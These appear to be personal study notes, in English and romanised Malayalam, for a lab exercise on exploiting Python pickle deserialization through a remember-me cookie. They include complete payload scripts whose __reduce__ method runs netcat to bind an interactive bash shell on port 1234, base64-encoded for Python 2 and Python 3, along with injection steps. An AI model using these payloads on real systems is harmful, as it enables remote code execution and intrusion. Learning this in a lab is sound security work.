## Introduction
-->This exercise covers the exploitation of Python's pickle when used to deserialize untrusted data
-->Serialisation of object is used by application to make their storage easier. If an application needs to store an instance of a class, it can use serialisation to get a string representation of this object. When the application needs to use the instance again, it will unserialise the string to get it.
-->Obviously, if the malicious user can tamper with a string that will be deserialised, they can potentially trigger unexpected behaviour in the application. Depending on the language and library used, this unexpected behaviour can go from arbitrary object creation to remote code execution. This exercise covers the Pickle library used by Python to perform serialisation and deserialisation of objects.

## Pickle
-->The following code is used to create and serialise an instance of the class Hack (here with Python 2) :
```python
	import cPickle
	class Hack:
	  def __init__(self):
	    self.test1 = "test"  
	    self.test2 = "retest"  
	 
	h = Hack()
	print cPickle.dumps(h)
	# print(cPicke.loads(h))   // to desiralise 
```
-->The line cPickle.dumps(Hack()) is used to transform the new instance h of the class Hack into a string.
-->Ini ee serialise chytha object desirialisation chyan `> print(cPicke.loads(h))` koduthal mathi
-->We can now see what a pickled object looks like :
```python
$ python test.py
	(i__main__
	Hack
	(dp1
	S'test1'
	p2
	S'test'
	p3
	sS'test2'
	p4
	S'retest'
	p5
	sb.
```
-->Since the format is multi-lines and contain a fair-bit of special characters, it's unlikely that a web application uses it as it is. Most web applications dealing with pickle objects will encode them (for example using base64).

## Code execution with Pickle
-->If an application unserialises data using pickle based on a string under your control, you can execute code in the application. To do so, you will need to create a malicious object. The following example creates an object that will bind a shell on port 1234 and run /bin/bash :
```python
 class Blah(object):
   def __reduce__(self):
       return (os.system,("netcat -c '/bin/bash -i' -l -p 1234 ",))
```

-->We can use the code from the previous section to get the pickled object. Now, we need to find where the application uses Pickled data. By inspecting the application, we can see that the application uses Pickle as part of the Remember me function. We can now try to send our malicious object in the remember_me cookie. After Base64 encoding the payload, we can then send it to the application to obtain command execution. If we do this, we can see that it doesn't work. By tacking a step back and thinking like the person who developed the application, we can make a guess: the remember_me cookie will only be processed if we do not provide a session. Once you send your payload without a session, you should be able to connect to the shell using netcat or telnet.
-->NOTE : If you use this payload, you will need to pickle the object on the same platform. Since the vulnerable system is a Linux system you will not be able to send an object pickled on Windows. You can bypass this limitation by using subprocess with __import__.
-->After the command gets executed, you should see a HTTP/500 error, this happens because you're sending a malicious object instead of a User object. The application unserialise your malicious object (the code execution happens), then the application tries to use the object but it crashes as your object doesn't have the right methods or attributes.

## Conclusion
-->This exercise demonstrated how to gain code execution if you have control over a string that is unserialised using Pickle. It also gives you a good method to find vulnerability: finding what is managed by the application/framework natively (the session mechanism) and what has been added by the developer (the remember_me functionality). The code from the base application or framework is likely to be more secure than the custom code, therefore, it often pays off to focus on the latter to find vulnerabilities.

# Video explanation
## Video 1 - pickle exploitation
```
serialisation :
	object -> data(string)
Deserialisation :
	data(string) -> object
```
-->athayath oru object database ilo allengil cookie yileko aakanengil object aayit place chyan patila.so developers ee object ine oru string aaki matum enit ee string aan cookie yilum database ilum oke add chyunath.so oru object ine string formatil aakuna process aan serialaisation
-->namal use chyuna lanaguages inum libraries num anusarich aan serialisation work aakuka.so eth language/library aan ennarinjale athinanusarich namuk code execution polula karyangal work aakundon ariyuka ok
-->python nte documentation il thane parayunund "Pickle module is not secure.Only pickle data you trust.Safer serialisation format such as json may be more appropirate if you are processing untrusted data"
-->karanm pickle vech code execution nokumbol namal valuthayit code onum ariyandan thonunu.automatic ayitan desirilaisation nadakunath.so namal athinanusarich karyangal chythamathi
-->application python2 il aano atho python3 il aano written chythathen ariyana. karanam python2 il aanengil namal cPickle module aan use chyendath. python3 aanengil pickle use chyanam
-->If you use python3, you will need to set the protocol version in pickle.dumps :
`>>> print pickle.dumps(Blah(),2)`

## Attack
-->exploitation chyanengil kurach karyangal ariyanam
- find where the application pickles data
- create your malicious object
- send you malicious object to the application
-->ingane exploit chyumbol 500 status error kanichal athinartham exploit nadanila ennala.so 500 error kanichalum namal ath work aayon nokanam.karanam namuk response kitunathin mumb thane serialisation nadanitundakum(ie,code execution nadanitundakum)

## Video 2 - exploitation against ISO
-->so adyam lab open chyuka enit oru account undakuka.enit aa account vech login chyuka
-->ini burp il poi nokumbol namude request oke kanan patum.avide namuk kanan patum namude cookie
```http
Cookie: session=eyJ1c2VybmFtZSI6Impvc3UifQ.FmdDOA.23V2LEZXZagBlfr5-Rjb6HmrFNA
```
-->so ivide ey enn kanunathkodn ith base64 encoded aanen thonunu.so ith namal decoder il itt decode chyumbol `{"username":"josu"fQ.gCOA.Ûuv,FWe¨úù-F6újÅNA`  ennan kanikunath
-->athayat aadyathe dot vere ullath namuk base64 il proper decode chyan patum. but athin shesham ullath namak decode chyan patila. karanam aa credentials aarum tamper chyathirikan jwt pole signature use chyunund.so aarengilum username josu mati admin aakiyapolum signature matan kazhiyathath kond tampering nadakila
-->But namal ivide oru functionality chech chyan maran poi ie, login chyuna samayath remember me enna oru option und.
-->so logout chyuka enit onukoodi login chyuka enit ipravisham login chyumbol remember me tick iduka enit login chyuka
-->so ingane login chythit nerteh pole burp il request analyse chyuka apol kanam ipravisham rand cookies namuk set aayitund :
```http
Cookie: rememberme="KGxwMQpWam9zdQpwMgphUyc5ZmI0ZTE2ZWM5MzIwYTAyZmVmMWM5MDA0ZTRkZjQ3NycKcDMKYS4="; session=eyJ1c2VybmFtZSI6Impvc3UifQ.FmdE_g.3rl0Zhe_hy_K6Vg3xoOVh9kyD-o
```
-->so ee remember me cookie eduth decoder il itt base64 decode chyuka :
```
(lp1
Vjosu
p2
aS'9fb4e16ec9320a02fef1c9004e4df477'
p3
a.
```
-->ipol kanam somestrings inte idayil josu enna namude username.so namal ini enth chyanamenal pickle use chyth namal thane oru malicious serialisatio undakuka enit base64 ecode chythit remember me cookie yil add chyanam.enit server ath desirialisation chyumbol namal enthano serialisation chyuna stringil koduthitullath ath server execute chyum ok
-->so first namal oru pickle object script undakanam :
```python
import cPickle
import os
import base64
class Blah(object):
   def __reduce__(self):
       return (os.system,("netcat -c '/bin/bash -i' -l -p 1234 ",))
print (base64.b64encode(cPickle.dumps(Blah()))
```
-->payload_pickle.py enn ee script in peru kodukam.ini ee script namude terminalil run chyam 
->python pickle.py 
-->ipol namude script serialisation chythit print chyapedum in base64.so ee base64 code eduthit ini namude remember me cookieyil idanma
-->so aadyam aa requst edut repeater il iduka enit remember me cookie yil namal ipo undakya base64 payload replace chyuka.enit send adikuka.
-->namude kalil yil nc vech listen chyanam.but ivide listen chythitum aakunila.
-->so enth chyanamenal rand cookie undalo.athil session cookie remove chyanam.enit onukoodi send adikumbol namuk nc il connect aakunund ok
-->already session cookie undenegil remember me cookie server chelapo check chyanamenila.so remember me cookiyil namal entheniglum exploitaion chyumbol session cookie remove chythit exploit chyan patunundon nokanam ok

## Video 3 - exploitation with python3
-->python 2 vech ull exploitation um sir padipikunund.but athinte avisham ila.namuk python3 mathi
-->python3 vech chyumbol namal exploitaion iso video yil kandapole cPickle use chyenda just picke enna mthram koduth import chythal mathi 
-->ini namuk script nokam :
```python
import base64
import os
import pickle 
class Blah(object):
   def __reduce__(self):
       return (os.system,("netcat -c '/bin/bash -i' -l -p 1234 ",))
print (base64.b64encode(pickle.dumps(Blah(),2)))
```
-->ivide last print chyuna samaya ,2 enn ittath enthanenal python2 ilum ee payload support chyan engandan.so namuk areela python2  aano atho 3 aano applicaiton support chyunathen
-->so ingane namuk kitiya base64 code eduthit namude site ile remember me cookie yil ittit send adikumbol namuk nc connection kitum.but namuk namude lab solve aan chyendath.athin namal ee net cat command angane thane remove chythit namude UUID vechula command kodukanam ennale lab solve aakum ie :
```python
import base64
import os
import pickle 
class Blah(object):
   def __reduce__(self):
       return (os.system,("/usr/local/bin/score 66d1486a-6571-4069-a67b-c4a70a99798d",))
print (base64.b64encode(pickle.dumps(Blah(),2)))
```
-->so ee script terminalil ittit ->python payload_pickle.py ennadikumbol namuk ithinte base64 code kitum.
-->so ith eduth namude lab il poi remember me cookiyil iduka enit session cookie remove chyuka enit cookie save chythit page reload chyuka apol namuk 500 internal server error kitum but namal challenge page il poi page reload chythal lab completed enn kanikum ok
-->so agnane lab compele aayi